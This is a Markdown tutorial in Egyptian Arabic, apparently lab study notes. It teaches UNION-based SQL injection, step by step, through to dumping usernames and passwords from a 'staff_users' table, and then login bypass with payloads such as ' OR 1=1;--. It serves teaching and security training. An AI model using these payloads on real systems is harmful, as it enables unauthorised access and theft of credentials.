# SQL injection

<details>
   <summary> in-band SQLI </summary>

🧪 الجزء العملي - خطوة بخطوة
1. اكتشاف الثغرة:
افتح المتصفح، وروح للرابط اللي فيه id=1.

جرب تحط ' بعد الرقم كده:


```
id=1'
```
هتلاقي رسالة خطأ ظهرت.
ده معناه إن المدخل بتاعك داخل فعلاً جوه استعلام SQL، وده تأكيد إن فيه ثغرة.

2. نبدأ نستغلها بـ UNION
جرب كده:

```
id=1 UNION SELECT 1
```
هتلاقي رسالة خطأ بتقولك إن عدد الأعمدة مش متطابق.

جرب تزود الأعمدة:
```
id=1 UNION SELECT 1,2
```
لسه في Error؟ زود كمان:

```
id=1 UNION SELECT 1,2,3
```
كده اشتغل! ليه؟ لأن الاستعلام الأصلي بيرجع 3 أعمدة، فلازم الاتحاد يكون بنفس العدد.

3. نخلي الـ UNION يشتغل لوحده
يعني نمنع الاستعلام الأصلي من إرجاع نتيجة.

اعمل id=0 بدلاً من 1:
```
id=0 UNION SELECT 1,2,3
```
كده الصفحة هتعرض النتائج اللي انت رجعتها.

4. نعرض اسم قاعدة البيانات:
```
id=0 UNION SELECT 1,2,database()
```
هيظهر لك اسم قاعدة البيانات، مثلاً: sqli_one.

5. نعرض أسماء الجداول داخل قاعدة البيانات:
```
id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
النتيجة:
```
article,staff_users
```

يبقى فيه جدول اسمه staff_users ده غالبًا فيه اليوزرز.

6. نعرف أسماء الأعمدة داخل جدول staff_users:
```
id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
النتيجة:
```
id,username,password
```

7. نجيب اليوزرات والباسوردات:
```
id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
هتلاقي النتائج بتظهر كده:

```
martin:123456
admin:qwerty
```


✅ ملخص سريع:

الخطوة | الهدف
------------|---------------------
' | تأكد وجود الثغرة
UNION SELECT 1,2,3 | تأكد من عدد الأعمدة
database() | جبت اسم قاعدة البيانات
information_schema.tables | جبت أسماء الجداول
information_schema.columns | جبت أسماء الأعمدة
staff_users | جبت البيانات الحساسة زي الباسورد

  
</details>






<details>
     <summary>Blind SQLI (Authentication Bypass)</summary>

      🕶️ Blind SQL Injection (الحقنة العمياء)
يعني إيه "Blind"؟
يعني مافيش رسائل خطأ، ولا داتا طالعة على الشاشة تقولك إن الهجمة نجحت.

لكن بالرغم من كده، الحقنة (injection) شغالة، بس السيرفر مابيظهرلكش حاجة مباشرة تقولك كده.

🧠 طيب نستفيد منها إزاي؟
كل اللي إحنا محتاجينه هو "رد فعل بسيط" من الموقع.
يعني مثلاً:

لو طلعلك صفحة معينة = الاستعلام نجح.

لو فضلك على نفس الصفحة = الاستعلام فشل.

وده كفاية إننا نبدأ نشتغل ونستخرج معلومات من قاعدة البيانات حتى لو بشكل بطيء.

🔓 Bypassing Authentication (تخطي تسجيل الدخول)
دي واحدة من أسهل الطرق في Blind SQLi، وممكن نكسر بيها فورم تسجيل الدخول.

🤔 إزاي بيشتغل تسجيل الدخول أصلاً؟
الموقع بيعمل استعلام بالشكل ده:

```
SELECT * FROM users WHERE username = 'ali' AND password = '123456' LIMIT 1;
```
لو فيه مستخدم بالبيانات دي، الاستعلام بيرجع صف واحد → يبقى المستخدم يدخل.

📌 إحنا نعمل إيه؟ نضحك على الاستعلام!
بدل ما نحاول نخمن Username وPassword، إحنا هنخلي الاستعلام يرجع نتيجة مهما كانت البيانات غلط.

🎯 الطريقة:
في خانة الـ Password، نكتب:

```
' OR 1=1;--
```
ده بيحوّل الاستعلام إلى:

```
SELECT * FROM users WHERE username = '' AND password = '' OR 1=1;--
```
شرحها:

'' AND '' → ده هيرجع false.

OR 1=1 → ده true دايمًا.

-- → ده بيعلّق باقي الاستعلام (يعني أي حاجة بعده مش بتتنفذ).

فالاستعلام كله بيرجع true، وكأنك سجلت دخولك بنجاح، حتى من غير Username أو Password!

✅ النتيجة:
لو الموقع معمول بشكل غير آمن، هيسمحلك بالدخول من غير بيانات صحيحة.

🛠️ ملحوظة مهمة:
لو ما نفعش:

جرب أنواع مختلفة من علامات التنصيص: " OR 1=1-- أو حتى ') OR ('1'='1.

جرب تحط القيمة في خانة الـ Username بدل Password.

🔐 ملخص سريع:



   العنصر | الوصف
   -------------|----------------
الهدف | تخطي تسجيل الدخول
نوع الهجوم | Blind SQLi
الوسيلة | استغلال منطق التحقق من صحة البيانات
الباي لود | ' OR 1=1;--
        
</details>













